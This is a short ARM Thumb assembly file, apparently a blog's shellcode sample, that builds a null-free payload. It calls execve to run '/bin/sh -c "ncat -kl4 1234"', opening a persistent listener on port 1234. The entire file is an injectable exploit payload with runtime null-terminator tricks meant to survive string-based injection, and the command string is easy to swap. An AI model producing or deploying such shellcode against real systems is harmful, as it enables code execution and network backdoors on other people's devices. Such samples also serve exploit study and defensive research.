/**
  execute command using /bin/sh
  tested with linux running on raspberry pi 3 

  http://modexp.wordpress.com/  
*/

    .global _start
    .text

_start:
    // switch to thumb mode
    .code 32
    add    r3, pc, #1
    bx     r3
    
    .code 16
    // execve("/bin/sh", {"/bin/sh", "-c", cmd, NULL}, NULL);
    eor    r2, r2, r2     // r2 = NULL
    
    adr    r0, sh         // r0 = "/bin/sh"
    strb   r2, [r0, #7]   // add null terminator
    
    adr    r1, c_arg      // r1 = "-c"
    strb   r2, [r1, #2]   // add null terminator

    adr    r3, cmd        // r3 = cmd
    strb   r2, [r3, #13]
    
    push   {r0, r1, r3, r2}
    mov    r1, sp         // r1 = argv
    mov    r7, #11        // r7 = execve
    svc    1
    nop                   // align by 4 bytes   
sh:    
.ascii "/bin/shX"
c_arg:
.ascii "-cXX"
cmd:
.ascii "ncat -kl4 1234XX" // listen on port 1234